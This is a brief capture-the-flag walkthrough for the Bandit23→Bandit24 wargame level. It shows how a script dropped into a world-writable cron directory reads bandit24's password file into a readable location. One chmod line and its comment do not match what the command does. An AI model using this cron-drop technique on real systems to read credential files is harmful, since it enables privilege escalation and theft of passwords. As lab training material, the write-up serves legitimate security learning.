## Level
Bandit23 → Bandit24

## Challenge
The cron job runs every script it finds in a directory that any user can write to, as the target user.

## Technique Used
Drop a small script there that copies the target's password to a location you can read, make it executable, then wait for cron to run it.

## Commands
```bash
cat /usr/bin/cronjob_bandit24.sh   # confirm it runs everything in the writable dir as bandit24
mkdir /tmp/mywork && cd /tmp/mywork
echo -e '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/mywork/out.txt' > payload.sh
chmod +x payload.sh
cp payload.sh /var/spool/bandit24/foo/
chmod 777 payload.sh   # ensure it's world-executable in the drop dir
sleep 65 && cat /tmp/mywork/out.txt
```
